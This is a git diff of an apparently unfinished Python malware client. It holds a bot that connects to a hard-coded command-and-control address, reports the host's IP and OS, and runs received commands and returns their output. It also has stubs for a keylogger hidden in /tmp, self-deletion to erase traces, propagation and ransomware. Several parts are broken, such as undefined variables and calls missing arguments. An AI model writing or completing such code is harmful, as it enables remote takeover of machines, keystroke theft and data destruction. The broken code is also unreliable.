@@ -10,7 +10,7 @@ MODULE NAME: ______
 try:
 	import socket # Import socket for creating TCP connection.
 	from subprocess import PIPE, run # Import subprocess to execute system commands.
-	from os import devnull # Import devnull from os to send stderr to devnull.
+	from os import devnull, remove, mkdir # Import devnull, mkdir, and remove from os module.
 	from sys import exit # Import exit from sys to quit program when specified.
 	from platform import system # Import system from platform to detect os.
 	from pynput import keyboard # Import keyboard to perform keylogger operations.
@@ -18,8 +18,13 @@ except ImportError:
     exit(1)
     
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
-
+#  CONSTANTS  #
 FILENAME = __file__[2:]
+IP = "172.17.0.1" # IP address to connect to.
+PORT = 1337 # Port number to create socket with.
+DIRECTORY = "/tmp/.folder" # Hidden folder to create for our keylogger.
+
+""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
 def create_client_socket(ip_addr: str, port: int):
 	"""This function creates a client socket to connect to 
@@ -31,7 +36,7 @@ def create_client_socket(ip_addr: str, port: int):
 			This function will return a socket object.
 	"""
 	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_sock: # Initializing socket.
-		conn = (ip_addr, port) # Connect to server IP/Port.
+		conn = (IP, PORT) # Connect to server IP/Port.
 		client_ip = socket.gethostbyname(host) # Get local IP using host name.
 		initial_message = "IP=" + client_ip + ",OS=" + system() # Send IP address and OS information.
 		client_sock.send(initial_message.encode()) # Send message with this host's IP back to the server.
@@ -47,7 +52,7 @@ def self_delete(name: str):
 		Returns:
 			None
 	"""
-	os.remove(name) # Delete the local file to remove traces of our presence 
+	remove(name) # Delete the local file to remove traces of our presence 
 	print("File Deleted") # Print a confirmation
 	
 def propagate(name: str):
@@ -67,13 +72,18 @@ def auto_recon():
 
 	"""
 
+def on_press():
+	"""
+	"""
+
 def keylogger():
 	"""This function will start a keylogger in the background and will save its
 		contents to /tmp folder.
 		Arguments:
 		Returns:
-
 	"""
+	with keyboard.Listener(onpress=on_press) as capturer:
+		mkdir()
 def ransomware():
 	"""This function will encrypt a folder, a file, or the entire volume on a computer.
 		Arguments:
@@ -88,7 +98,7 @@ class WindowsBot:
 		that are specific to the Windows operating system.
 	"""
 	def __init__(self):
-		self.ip_addr = "172.17.0.1"
+		pass
 
 	def exec_windows_cmd(self, commnd: str):
 		"""This function will execute Windows commands requested by the C&C.
@@ -146,7 +156,7 @@ class LinuxBot:
 			Returns:
 				None
 		"""
-		sock = create_client_socket(self.ip_addr) # Store socket object.
+		sock = create_client_socket() # Store socket object.
 		command = sock.recv(1024).decode('utf-8') # Receive command from server.
 		command_output = self.exec_linux_cmd(command) # Execute command on machine and store the response.
 		sock.send(command_output) # Send the output to the C&C server.
